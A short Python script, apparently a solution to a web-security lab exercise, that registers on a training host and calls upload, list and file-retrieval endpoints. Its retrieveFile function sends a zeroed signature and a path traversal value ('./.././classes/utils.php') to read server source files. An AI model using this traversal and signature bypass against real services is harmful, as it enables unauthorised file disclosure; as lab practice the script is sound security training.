import requests

def login():    
    url = "http://ptl-4cf1041dc675-7b2d1be15892.libcurl.me/register"

    data = {
        "username": "gdykbp",
        "password": "password"
    }

    response = requests.post(url, json=data)

    print("Status Code:", response.status_code)
    print(response.text)

token = "Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtpOjI7czo1OiJsb2dpbiI7czo2OiJnZHlrYnAiO30%3D--1344390868a10635305216de0e96768f"

def upload():
    url = "http://ptl-4cf1041dc675-7b2d1be15892.libcurl.me/upload"
    data = {
        "token": "Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtpOjI7czo1OiJsb2dpbiI7czo2OiJnZHlrYnAiO30%3D--1344390868a10635305216de0e96768f",
        "filename": "text.txt",
        "content": "Hello World"
    }
    response = requests.post(url, json=data)
    print(response.text)


def listFiles():
    url = "http://ptl-4cf1041dc675-7b2d1be15892.libcurl.me/files"
    data = {
        "token": "Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtpOjI7czo1OiJsb2dpbiI7czo2OiJnZHlrYnAiO30%3D--1344390868a10635305216de0e96768f",
    }
    response = requests.post(url, json=data)
    print(response.text)


#{ "token": "9299...2", "uuid": "192..", "sig": "12..."}

def retrieveFile():
    url = "http://ptl-4cf1041dc675-7b2d1be15892.libcurl.me/file"
    data = {
        "token": "Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtpOjI7czo1OiJsb2dpbiI7czo2OiJnZHlrYnAiO30%3D--1344390868a10635305216de0e96768f",
        "sig": 0,
        "uuid": "./.././classes/utils.php"
    }
    response = requests.post(url, json=data)
    print(response.text)

if __name__ == "__main__":
    retrieveFile()

